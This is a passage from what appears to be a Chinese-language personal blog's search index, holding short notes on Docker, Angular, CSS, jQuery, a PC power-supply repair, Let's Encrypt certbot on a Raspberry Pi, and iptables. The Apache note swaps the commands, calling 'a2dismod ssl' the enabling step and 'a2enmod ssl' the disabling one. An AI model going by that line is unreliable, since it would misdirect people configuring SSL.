rel=\"noopener\">http://codeigniter.org.cn/forums/thread-21295-1-1.html</a><br>由於我是用Docker設定<br>目前猜測可能權限有問題…<br>導制錯誤<br>在此記錄，不然一下就忘記了XD</p>\n","categories":["CodeIgniter"]},{"title":"[CSS]flex筆記","url":"/blog/2017/08/03/logdown/2017-08-03-cssflex-notes/","content":"<p><a href=\"https://www.facebook.com/WccCasper/videos/414910278905201/\" target=\"_blank\" rel=\"noopener\">https://www.facebook.com/WccCasper/videos/414910278905201/</a><br><a href=\"https://paper.dropbox.com/doc/Flex-1lWq76W07m67326psOncP\" target=\"_blank\" rel=\"noopener\">https://paper.dropbox.com/doc/Flex-1lWq76W07m67326psOncP</a><br><a href=\"http://wcc723.github.io/WorkShop-gh-pages/cssFlex/\" target=\"_blank\" rel=\"noopener\">http://wcc723.github.io/WorkShop-gh-pages/cssFlex/</a></p>\n","categories":["CSS"],"tags":["CSS","flex"]},{"title":"vertical-align對齊屬性筆記","url":"/blog/2017/07/04/logdown/2017-07-04-2000076/","content":"<p>常常採到inline-block記一下筆記<br><a href=\"http://www.cnblogs.com/starof/p/4512284.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/starof/p/4512284.html</a></p>\n","categories":["CSS"],"tags":["CSS","vertical-align"]},{"title":"COSCUP2017隨意筆記","url":"/blog/2017/08/05/logdown/2017-08-05-coscup-random-notes/","content":"<p>COSCUP VPS安全維護<br>可以iptable設定<br>waf(web application firewall)<br>SELinux</p>\n<p>ssh(SSH) -&gt; ssh(WEB)<br>log記錄到別台去</p>\n<p>apache版本</p>\n<p><a href=\"https://www.slideshare.net/smalltown20110306/coscup-2017-infrastructure-as-code\" target=\"_blank\" rel=\"noopener\">https://www.slideshare.net/smalltown20110306/coscup-2017-infrastructure-as-code</a><br><a href=\"http://blog.chengweichen.com/2017/08/coscup-2017-ansible-gitlab-cicd.html\" target=\"_blank\" rel=\"noopener\">http://blog.chengweichen.com/2017/08/coscup-2017-ansible-gitlab-cicd.html</a></p>\n","categories":["HTML"]},{"title":"Docker 新手筆記","url":"/blog/2017/08/20/logdown/2017-08-20-2201711/","content":"<p>買Docker 入門與實戰，當然要記一下筆記…<br>以後開發盡量用Docker做:P</p>\n<a id=\"more\"></a>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -it --name linux1 ubuntu</span><br></pre></td></tr></table></figure>\n<p>會執行會開linux bash<br>加個<code>-d</code>就會背景執行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -itd --name linux1 ubuntu</span><br></pre></td></tr></table></figure>\n<p>要進入shell裡面<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker exec -it linux1 /bin/bash</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>當然，大家也可以試試看，如果沒有加 -it ，基本上，只 run 一下，馬上就跳回來了 XDD</p>\n</blockquote>\n<blockquote>\n<p>那 -it 是甚麼意思呢，根據官方文件如下。<br>-i : Keep STDIN open even if not attached<br>-t : Allocate a pseudo-tty<br><a href=\"https://skychang.github.io/2017/01/06/Docker-Docker_for_Windows_10_First/\" target=\"_blank\" rel=\"noopener\">Docker - Docker for Windows 10 入門篇 | 天空的垃圾場</a></p>\n</blockquote>\n<p>要進入前先確定你的docker container是否有運行，才能進去</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker ps</span><br></pre></td></tr></table></figure>\n<p>查看運行中的container</p>\n<p>(新手常忘XD)查全部的container       [運行+沒運行]<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker ps -a</span><br></pre></td></tr></table></figure></p>\n<p>玩了這麼多，要刪掉那麼多測試的container<br>有什麼辦法呢XD<br>後來有找到<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">####################################</span><br><span class=\"line\">## 小技巧 ##########################</span><br><span class=\"line\">####################################</span><br><span class=\"line\"></span><br><span class=\"line\"># 停止所有的 containers</span><br><span class=\"line\">$ docker stop $(docker ps -a -q)</span><br><span class=\"line\"></span><br><span class=\"line\"># 刪除所有的 containers</span><br><span class=\"line\">$ docker rm $(docker ps -a -q)</span><br><span class=\"line\"></span><br><span class=\"line\"># 刪除所有的 images</span><br><span class=\"line\">$ docker rmi $(docker images -a -q)</span><br></pre></td></tr></table></figure></p>\n<p>參考來源：<a href=\"https://ithelp.ithome.com.tw/articles/10186431\" target=\"_blank\" rel=\"noopener\">【Day 3】 - Docker 基本指令操作 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></p>\n<blockquote>\n<p>host 與 container 互傳資料</p>\n</blockquote>\n<blockquote>\n<p>這部分其實跟上面的 Dockerfile 沒甚麼關係，只是剛好可以一併提到，若是建立 container 時沒有使用 <strong>-v</strong> 參數掛載 host 目錄，還是可以用以下的命令可以將資料從 container 中複製出來：</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 其中 python_flask 是 container 名稱</span><br><span class=\"line\">$ docker cp python_flask:/flask/app.py .</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>當然也可以把 host 資料放進 container 中：</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ touch file_in_host</span><br><span class=\"line\"></span><br><span class=\"line\">$ docker cp file_in_host python_flask:/flask</span><br><span class=\"line\"></span><br><span class=\"line\">$ docker exec python_flask ls /flask</span><br><span class=\"line\">app.py</span><br><span class=\"line\">file_in_host</span><br></pre></td></tr></table></figure>\n<p>參考來源：<a href=\"https://godleon.github.io/blog/2015/11/27/Docker-Getting-Start-With-Dockerfile\" target=\"_blank\" rel=\"noopener\">https://godleon.github.io/blog/2015/11/27/Docker-Getting-Start-With-Dockerfile</a></p>\n<h2 id=\"Data-Volumes\"><a href=\"#Data-Volumes\" class=\"headerlink\" title=\"Data Volumes\"></a>Data Volumes</h2><p>以資料夾作為volume<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -d -P --name web -v /src/webapp:/opt/webapp traning/webapp python app.py</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Data-Volume-Containers\"><a href=\"#Data-Volume-Containers\" class=\"headerlink\" title=\"Data Volume Containers\"></a>Data Volume Containers</h2><p>建立一個資料卷容器，掛載在容器裡面<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -it -v /dbdata --name dbdata ubuntu</span><br></pre></td></tr></table></figure></p>\n<p><code>--rm</code> 跑完container會刪除</p>\n<p>聽說container關了，裡面資料會不見<br>但是我…stop，再打開都還有東西<br>後來找到這篇要rm才會沒有東西XD</p>\n<p>兩個dash，是什麼意思Google一下有找到解答<br><a href=\"http://www.wallcopper.com/linux/588.html\" target=\"_blank\" rel=\"noopener\">linux shell环境减号”-“的用途 | 等闲之辈莫等闲</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker container run  ls -l</span><br><span class=\"line\"></span><br><span class=\"line\">docker container run -it xxx /bin/bash</span><br><span class=\"line\"></span><br><span class=\"line\">docker container ls</span><br><span class=\"line\"></span><br><span class=\"line\">docker container ls -a</span><br><span class=\"line\"></span><br><span class=\"line\">docker image pull xxx</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">apt-get update -qq</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://stackoverflow.com/questions/45254677/is-there-a-difference-between-docker-ps-and-docker-container-ls\" target=\"_blank\" rel=\"noopener\">Is there a difference between “docker ps” and “docker container ls”? - Stack Overflow</a></p>\n<p>差別<br><a href=\"http://dockone.io/article/2059\" target=\"_blank\" rel=\"noopener\">Docker 1.13 管理命令 - DockOne.io</a></p>\n<p><a href=\"http://benjr.tw/293\" target=\"_blank\" rel=\"noopener\">PAM-範例 – Benjr.tw</a></p>\n<p>/var/run是做什麼用<br><a href=\"http://blog.ddup.us/2011/04/01/disappearing-var-run-dir/\" target=\"_blank\" rel=\"noopener\">即将消逝的目录 /var/run</a></p>\n","categories":["Docker"],"tags":["Docker"]},{"title":"anglular隨意筆記","url":"/blog/2017/08/06/logdown/2017-08-06-anglular-random-notes/","content":"<p>npm install -g @angular/cli</p>\n<p>Angular Language Service<br>Angular TypeScript Snippets for VS Code<br>Prettier formatter for Visual Studio Code</p>\n<p>ng new coscup</p>\n<p>ng g c title 建立compent</p>\n<p>ng g d todo 建立Directive<br><a href=\"https://github.com/augt/S02Todo/tree/master/todomvc-template\" target=\"_blank\" rel=\"noopener\">https://github.com/augt/S02Todo/tree/master/todomvc-template</a><br><a href=\"https://forum.angular.tw/t/coscup-workshop-angular/466/2\" target=\"_blank\" rel=\"noopener\">https://forum.angular.tw/t/coscup-workshop-angular/466/2</a><br><a href=\"https://hackmd.io/p/HJwfMifD-#/6/2\" target=\"_blank\" rel=\"noopener\">https://hackmd.io/p/HJwfMifD-#/6/2</a></p>\n<p>ng generate pipe pipe/my-filer</p>\n<p><a href=\"http://oomusou.io/angular/angular-coscup-api/\" target=\"_blank\" rel=\"noopener\">http://oomusou.io/angular/angular-coscup-api/</a></p>\n<p>ng g i post</p>\n<p> ng g s services/data</p>\n"},{"title":"好懷念leoboard論壇，用docker動手做cgi環境(未完成)","url":"/blog/2017/08/22/logdown/2017-08-22-i-really-miss-the-leoboard-forums-with-docker-to-make-cgi-environment/","content":"<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;IfModule !mpm_prefork_module&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        LoadModule cgid_module modules/mod_cgid.so</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/IfModule&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;IfModule mpm_prefork_module&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        LoadModule cgi_module modules/mod_cgi.so</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ScriptAlias /cgi-bin/ &quot;/usr/local/apache/cgi-bin/&quot; apache</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[Wed Mar 19 15:40:31.179155 2014] [cgid:error] [pid 4796:tid 140208841959296] (13)Permission denied: AH01241: exec of &apos;/var/cgi-bin/echo.pl&apos; failed</span><br></pre></td></tr></table></figure>\n<p><code>chmod +x /var/cgi-bin/echo.pl</code></p>\n<p><a href=\"http://nohup.cc/article/206/\" target=\"_blank\" rel=\"noopener\">http://nohup.cc/article/206/</a><br><a href=\"http://www.cnblogs.com/phpgo/p/5669818.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/phpgo/p/5669818.html</a><br><a href=\"https://stackoverflow.com/questions/18392741/apache2-ah01630-client-denied-by-server-configuration\" target=\"_blank\" rel=\"noopener\">https://stackoverflow.com/questions/18392741/apache2-ah01630-client-denied-by-server-configuration</a></p>\n","categories":["Docker"],"tags":["Docker"]},{"title":"DB設定常常忘記一此筆記","url":"/blog/2017/08/25/logdown/2017-08-25-2214765/","content":"<p>在公司學到的東西，但還沒有實作過<br>先筆記一下</p>\n<a id=\"more\"></a>\n<p>要做blog移轉，筆記先存檔…<br>刪除主鍵、鎖引鍵，要刪全部資料，才能做刪除動作<br>新增主鍵、鎖引鍵，聽說DB10才不用刪資料，就可以新增</p>\n","categories":["SQL"],"tags":["sql","DB"]},{"title":"[JS]event.preventDefault和event.stopPropagation","url":"/blog/2017/08/24/logdown/2017-08-24-2212154/","content":"<p>今天不熟網頁功能同事問我，他對設定用CSS(Bootstrap) disabled樣式<br>有沒有辦法讓他不用點<br>我立馬寫jQuery使用event.stopPropagation<br>結果發現沒有什麼作用</p>\n<p>雖然後來網路找到解法，但這個雷記一下XD<br>希望下次別再踩到了</p>\n<a id=\"more\"></a>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">$(<span class=\"built_in\">document</span>).ready(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    $(<span class=\"string\">'a[disabled]'</span>).click(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">         event.preventDefault();</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p><code>event.preventDefault();</code> 終止預設行為，如上，不會對超連結做跳頁動作</p>\n<p><code>event.stopPropagation()</code>終止事件傳遞</p>\n<p>希望不要再跳坑一次了XD</p>\n<p>題外話：剛剛突然想到jQuery 預設事件是 氣泡事件，但突然想到jQuery怎麼預設 事件補捉<br>但…發現jQuery好像沒有事件補捉這個觸發</p>\n","categories":["JavaScript"],"tags":["JavaScript","preventDefault和event","stopPropagation"]},{"title":"電腦不明原因，玩遊戲或看影片重開機維修記錄","url":"/blog/2017/09/06/logdown/2017-09-06-reasons-unknown-computer-reboot-the-maintenance-records/","content":"<p>半年前多，電腦會因為看影片快轉或放大縮小，會重新開機<br>我使用Potplayer播放器，有上網搜尋一下<br>有找到是顯示卡問題，但後來有更新顯示卡還是一樣<br>直到最近…<br>(難得寫硬體筆記XD?!)<br><a id=\"more\"></a></p>\n<p>最近玩GTA5玩到一半會重新開機<br>一開始我以為是CPU<br>因為我CPU是4790k，玩遊戲CPU會超到9x度</p>\n<p>不過後來我發現並非90度才會發生這個狀況<br>我後來玩GTA5 發現  縮小遊戲後放大後才會這樣<br>那時CPU原本待機也才5x度<br>不太可能是CPU過熱</p>\n<p>我就開始更新主機版 ASUS Z79-Pro 的BIOS<br>更新完再測試，還是一樣會重新開機<br>但這次有跳出東西<br><img src=\"https://i.imgur.com/QhxPT2S.jpg\" alt=\"Imgur\"><br>???</p>\n<p>POWER有問題斷電??因為我POWER是買海韻 G-650   (聽說G650災情多  哀哀)<br>聽大廠不容易發生問題才對….，原先排除POWER，改電壓不穩來查<br>由於我家常常跳電，我有買一個UPS<br>我同學建議我先別插UPS上，直接插在插座</p>\n<p>開GTA5還是一樣發生這個狀況，網路上還有說，把BIOS關掉…，一樣還有這個狀況<br>(奇怪怎麼有人說關掉可以解決??)<br><del>後來就絕望</del></p>\n<p>最後我和同學估是CPU過熱或POWER問題</p>\n<p>但因為海韻是大廠關係，所以先排除:|<br>然後就找4790k CPU風扇<br>當下有考慮買水冷<br>但因為水冷裝不好可能會造成整台電腦壞掉<br>因為哥電腦要撐10年…<br><del>在下沒膽</del><br>所以我有爬到散塔這個東西</p>\n<p>Cooler Master Hyper 212X 跟 T40<br> 後來網路上爬T40文獻比較多<br> <a href=\"https://www.youtube.com/watch?v=AEEmcgUZo7E\" target=\"_blank\" rel=\"noopener\">https://www.youtube.com/watch?v=AEEmcgUZo7E</a><br> 所以就選T40</p>\n<p>最後，T40風扇真的不太好裝，花了2小時時間…<br>但測試溫度真的有差<br>平時待機T40大概4x度，原廠的約5x度<br>玩GTA5 T40大概最高7x度，原廠9x度<br>在以為全部都搞定的說<br>我玩GTA5玩到一半又重新開機了</p>\n<p>#<del>再次崩潰</del></p>\n<p>後來發現影片快轉也會發生</p>\n<blockquote>\n<p>＂Power supply surges detected during the previous power on.<br>ASUS Anti-Surge was triggered to protect system from unstable power supply unit!<br>Press F1 to Run SETUP＂</p>\n</blockquote>\n<p>原來以前就會這樣orz，所以BIOS也還是要更新會比較好</p>\n<p>在這期間，我還不死心的測試<br>有爬到有一個測試工具可以測POWER<br>一個叫OCCT，阿榮福利味有免安裝版<br><a href=\"http://www.azofreeware.com/2016/05/occt.html\" target=\"_blank\" rel=\"noopener\">http://www.azofreeware.com/2016/05/occt.html</a><br>測試一下，馬上按ON就重新開機<br><del>原來死利    虧我這麼相信你</del><br>然後測到第三次，電腦會開機就會重開機(連到桌面到不了)PS: SSD開機不到30秒</p>\n<p>最後就送修，有找到海韻快修中心<br>北部在台灣三重那邊，我有打電話過去問<br>他晚上6點就關門了…  六日也休息<br>所以我就用值班早上當天去用<br>網路上很多人換到不能用<br>我後來換回來使用正常</p>\n<p>然後開機時顯示卡用YCbCr顏色正常，因為我之前螢幕顏色怪怪<br>現在正常了</p>\n<p>最後，有簡單的暴力快轉影片放大、縮小，都正常<br>用OCCT測試5分鐘後，UPS會叫，後來停止測試又不會叫<br>但沒有重新開機了<br>(會叫的原因太操???)<br>至於GTA5待接下來假日再試啦</p>\n<p>筆記就記到這了</p>\n<p>結論</p>\n<h1 id=\"好的POWER帶你上天堂；壞的POWER帶你下地獄\"><a href=\"#好的POWER帶你上天堂；壞的POWER帶你下地獄\" class=\"headerlink\" title=\"好的POWER帶你上天堂；壞的POWER帶你下地獄\"></a>好的POWER帶你上天堂；壞的POWER帶你下地獄</h1><p>可以安心睡覺</p>\n"},{"title":"Raspberry PI 自動設定Let’s Encrypt！ TLS(SSL 憑證)","url":"/blog/2017/09/11/logdown/2017-09-11-erection-of-https/","content":"<p> 最近想讓動物機增加安全性，有看到免費的letsencrypt教學文<br> 又好像有工具自動產生憑證<br> 以經有看到勇者試了，當然也要嘗試:P</p>\n<a id=\"more\"></a>\n<p>本來想說應該會很順利吧<br>結果沒有…</p>\n<p><a href=\"https://www.weblink.idv.tw/2017/74\" target=\"_blank\" rel=\"noopener\">申請Let’s Encrypt－以Raspberry Pi為例 </a>，<br>再做這篇的時候會跳出版本太舊</p>\n<p><code>sudo ./certbot-auto --apache --domain=**網域** certonly</code></p>\n<p>動物機好像說版本太舊</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo apt-get remove libaugeas0 augeas-tools libaugeas-dev</span><br><span class=\"line\">$ sudo apt-get install libreadline6-dev libxml2-dev</span><br><span class=\"line\">$ cd /tmp</span><br><span class=\"line\">$ wget http://download.augeas.net/augeas-1.6.0.tar.gz</span><br><span class=\"line\">$ tar -zxf augeas-1.6.0.tar.gz</span><br><span class=\"line\">$ cd augeas-1.6.0</span><br><span class=\"line\">$ CFLAGS=&apos;-march=armv6 -mfpu=vfp -mfloat-abi=hard&apos; CPPFLAGS=&apos;-march=armv6 -mfpu=vfp -mfloat-abi=hard&apos; ./configure</span><br><span class=\"line\">$ CFLAGS=&apos;-march=armv6 -mfpu=vfp -mfloat-abi=hard&apos; CPPFLAGS=&apos;-march=armv6 -mfpu=vfp -mfloat-abi=hard&apos; make</span><br><span class=\"line\">$ sudo make install</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://lordofthemoon.com/blog/2016/08/lets-encrypt-for-the-raspberry-pi-model-b/\" target=\"_blank\" rel=\"noopener\">Let’s Encrypt for the Raspberry Pi (model B)</a><br>後來找上面那個方法還是沒用<br>最後<del>賭</del>升級<code>sudo apt-get dist-uprgrade</code><br>升上去就可以跑了…</p>\n<p>但會出現Timeout狀態<br>(之後有找到原因我的AP的 Virtual Server沒有設定443PORT)<br>不過我最後設完，apache設定沒有自動增加ssl設定</p>\n<p>看來有機會還是要開一個apache筆記</p>\n<p>最後看到另一篇用webroot方法，<a href=\"https://ezbox.idv.tw/52/free-ssl-lets-encrypt-certbot/\" target=\"_blank\" rel=\"noopener\">免費的 SSL 憑證：Let’s Encrypt！</a></p>\n<p><code>sudo ./certbot-auto certonly --webroot -d ***網域***</code></p>\n <figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Saving debug log to /var/log/letsencrypt/letsencrypt.log</span><br><span class=\"line\">Plugins selected: Authenticator webroot, Installer None</span><br><span class=\"line\">Obtaining a new certificate</span><br><span class=\"line\">Performing the following challenges:</span><br><span class=\"line\">http-01 challenge for ****</span><br><span class=\"line\"></span><br><span class=\"line\">Select the webroot for ****</span><br><span class=\"line\">-------------------------------------------------------------------------------</span><br><span class=\"line\">1: Enter a new webroot</span><br><span class=\"line\">-------------------------------------------------------------------------------</span><br><span class=\"line\">Press 1 [enter] to confirm the selection (press &apos;c&apos; to cancel):</span><br><span class=\"line\"></span><br><span class=\"line\">** Invalid input **</span><br><span class=\"line\">Press 1 [enter] to confirm the selection (press &apos;c&apos; to cancel): 1</span><br><span class=\"line\">Input the webroot for ******: (Enter &apos;c&apos; to cancel):</span><br><span class=\"line\"></span><br><span class=\"line\">-------------------------------------------------------------------------------</span><br><span class=\"line\"> does not exist or is not a directory</span><br><span class=\"line\">-------------------------------------------------------------------------------</span><br><span class=\"line\">Input the webroot for ********: (Enter &apos;c&apos; to cancel): /var/www/</span><br><span class=\"line\">Waiting for verification...</span><br><span class=\"line\">Cleaning up challenges</span><br><span class=\"line\"></span><br><span class=\"line\">IMPORTANT NOTES:</span><br><span class=\"line\"> - Congratulations! Your certificate and chain have been saved at:</span><br><span class=\"line\">   /etc/letsencrypt/live/****/fullchain.pem</span><br><span class=\"line\">   Your key file has been saved at:</span><br><span class=\"line\">   /etc/letsencrypt/live/****/privkey.pem</span><br><span class=\"line\">   Your cert will expire on 2017-12-10. To obtain a new or tweaked</span><br><span class=\"line\">   version of this certificate in the future, simply run certbot-auto</span><br><span class=\"line\">   again. To non-interactively renew *all* of your certificates, run</span><br><span class=\"line\">   &quot;certbot-auto renew&quot;</span><br><span class=\"line\"> - If you like Certbot, please consider supporting our work by:</span><br><span class=\"line\"></span><br><span class=\"line\">   Donating to ISRG / Let&apos;s Encrypt:   https://letsencrypt.org/donate</span><br><span class=\"line\">   Donating to EFF:                    https://eff.org/donate-le</span><br></pre></td></tr></table></figure>\n<p>看到這個就表示成功</p>\n<blockquote>\n<p> 申請的網域的SSL憑證<br>cert.pem: Your domain’s certificate<br> Let’s Encrypt 的 鏈證書<br>chain.pem: The Let’s Encrypt chain certificate<br> cert.pem 和 chain.pem 的合併檔<br>fullchain.pem: cert.pem and chain.pem combined<br> SSL憑證的私鑰，千千萬萬要飽護好<br>privkey.pem: Your certificate’s private key</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;VirtualHost *:443&gt;</span><br><span class=\"line\">        ServerAdmin service@**網域**</span><br><span class=\"line\">        DocumentRoot /var/www/</span><br><span class=\"line\">        ServerName **網域**</span><br><span class=\"line\">        ServerAlias **網域**</span><br><span class=\"line\"></span><br><span class=\"line\">        SSLEngine On</span><br><span class=\"line\">        SSLCertificateFile /etc/letsencrypt/live/**網域**/cert.pem</span><br><span class=\"line\">        SSLCertificateKeyFile /etc/letsencrypt/live/**網域**/privkey.pem</span><br><span class=\"line\">        SSLCertificateChainFile /etc/letsencrypt/live/**網域**/chain.pem</span><br><span class=\"line\">        SSLCACertificateFile /etc/letsencrypt/live/**網域**/fullchain.pem</span><br><span class=\"line\">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>\n<p><code>Invalid command &#39;SSLEngine&#39;, perhaps misspelled or defined by a module not included in the server configuration</code><br>這個錯誤訊息是  沒有啟用ssl模組<br>啟用<br><code>sudo a2dismod ssl</code></p>\n<p>但後來發現怎麼很多沒有教關閉<br>爬文一下就找到了</p>\n<p>關閉<br><code>sudo a2enmod ssl</code></p>\n<p>因為先前發現不能連webroot可以產生<br>但還是連不到443port<br>後來發現是Virtual Server沒設<br>設定完OK<br>想說試試第一個方法跑一次<br>結果跑出另一個憑證</p>\n<p>爬文找刪除<br>直接刪資料夾是不能解決問題的XD</p>\n<h1 id=\"回收憑證\"><a href=\"#回收憑證\" class=\"headerlink\" title=\"回收憑證\"></a>回收憑證</h1><p>　　<code>certbot revoke --cert-path /etc/letsencrypt/live/example.com/cert.pem</code></p>\n<p>　　<code>certbot delete --cert-name example.com</code></p>\n<p>Ubuntu 12.04啟用apache的 SSL<br><a href=\"http://kirby86a.pixnet.net/blog/post/95136568-ubuntu-12.04%E5%95%9F%E7%94%A8apache%E7%9A%84-ssl\" target=\"_blank\" rel=\"noopener\">http://kirby86a.pixnet.net/blog/post/95136568-ubuntu-12.04%E5%95%9F%E7%94%A8apache%E7%9A%84-ssl</a><br>免費的 SSL 憑證：Let’s Encrypt！<br><a href=\"https://ezbox.idv.tw/52/free-ssl-lets-encrypt-certbot/\" target=\"_blank\" rel=\"noopener\">https://ezbox.idv.tw/52/free-ssl-lets-encrypt-certbot/</a></p>\n<p>番外apache mod rewrite功能</p>\n<p><code>sudo a2enmod rewrite</code></p>\n<p>or</p>\n<p><code>sudo ln -s /etc/apache2/mods-available/rewrite.load /etc/apache2/mods-enabled/rewrite.load</code></p>\n<p>在/etc/apache2/sites-enabled/000-default</p>\n<p><code>AllowOverride None</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">RewriteEngine on</span><br><span class=\"line\">RewriteCond  %&#123;HTTPS&#125; !=on</span><br><span class=\"line\">#RewriteRule  ^(.*) https://%&#123;SERVER_NAME&#125;$1 [L,R]</span><br><span class=\"line\"> RewriteRule ^(.*)$ https://%&#123;HTTP_HOST&#125;%&#123;REQUEST_URI&#125; [L,R]</span><br></pre></td></tr></table></figure>\n<p>這樣http就能導到https了</p>\n<p>我有擋國外IP要怎麼自動更新憑證</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">iptables -F</span><br><span class=\"line\">/usr/local/bin/certbot-auto renew --quiet</span><br><span class=\"line\">sh /etc/network/iptables.sh</span><br></pre></td></tr></table></figure>\n<p>自動更新憑證<br><code>30 2 1 * * sh /root/ssl_bot.sh</code></p>\n<p><strong>2017/10/17</strong><br>發現網站憑證日期怎麼沒有更新…<br>以為設定有問題<br>Google查了一下</p>\n<blockquote>\n<p>這是因為certbot-auto renew 會讀取 /etc/letsencrypt/renewal 下的設定<br>檢查每個授權是否距離過期時間只剩30天，如果是才執行更新<br>( 參考：<a href=\"https://tiicle.com/items/15/ubuntu-1404-using-the-let-s-configuration-is-security-to-encrypt-nginx-https-server\" target=\"_blank\" rel=\"noopener\">https://tiicle.com/items/15/ubuntu-1404-using-the-let-s-configuration-is-security-to-encrypt-nginx-https-server</a> )</p>\n</blockquote>\n<p>待下個月再檢查</p>\n<p>參考來源: <a href=\"https://www.tipga.com/e/597853093286fe2b8f7a56e5\" target=\"_blank\" rel=\"noopener\">https://www.tipga.com/e/597853093286fe2b8f7a56e5</a></p>\n<hr>\n<p>在RT1900AC上使用Let’s Encrypt的SSL憑證-半殘版<br><a href=\"https://darkdragon-darkdragon.blogspot.com/2017/05/rt1900aclets-encryptssl.html\" target=\"_blank\" rel=\"noopener\">https://darkdragon-darkdragon.blogspot.com/2017/05/rt1900aclets-encryptssl.html</a><br>NGINX 使用 Let’s Encrypt 免費 SSL 憑證設定 HTTPS 安全加密網頁教學<br><a href=\"https://blog.gtwang.org/linux/secure-nginx-with-lets-encrypt-ssl-certificate-on-ubuntu-and-debian/\" target=\"_blank\" rel=\"noopener\">https://blog.gtwang.org/linux/secure-nginx-with-lets-encrypt-ssl-certificate-on-ubuntu-and-debian/</a></p>\n<p>啟動 Ubuntu 下的 Apache mod rewrite 與相關設定<br><a href=\"http://asika.windspeaker.co/post/3471-start-with-ubuntu-apache-the-mod-the-rewrite-set\" target=\"_blank\" rel=\"noopener\">http://asika.windspeaker.co/post/3471-start-with-ubuntu-apache-the-mod-the-rewrite-set</a></p>\n","categories":["Linux"],"tags":["Linux","TLS","SSL","Let’s Encrypt","Certbot"]},{"title":"socket的timeout問題","url":"/blog/2017/09/08/logdown/2017-09-08-2327309/","content":"<p>提醒一下自己，socket會有timeout問題<br>最近跟廠商接處，可能這點記錄一下</p>\n<a id=\"more\"></a>\n<p>要做blog移轉，筆記先存檔…<br>這篇應該不會有實作= =|||</p>\n","categories":["寫程式一些事"],"tags":["socket"]},{"title":"修改iptables設定筆記","url":"/blog/2017/09/10/logdown/2017-09-10-2375763/","content":"<p>最近想在動物機加上https協定<br>所以必須在iptables加上443 的port<br>但是…iptables早就忘了</p>\n<a id=\"more\"></a>\n<p>原本設定<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">iptables -F</span><br><span class=\"line\">iptables -P INPUT DROP</span><br><span class=\"line\">iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 192.168.1.0/24 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -i lo -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#taiwan ip input http:80</span><br><span class=\"line\">iptables -A INPUT -s 61.216.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 218.160.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 210.62.248.0/21 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 211.20.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 211.72.128.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 211.72.0.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 210.242.0.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 210.71.128.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 203.75.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 202.39.128.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 103.25.236.0/22 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 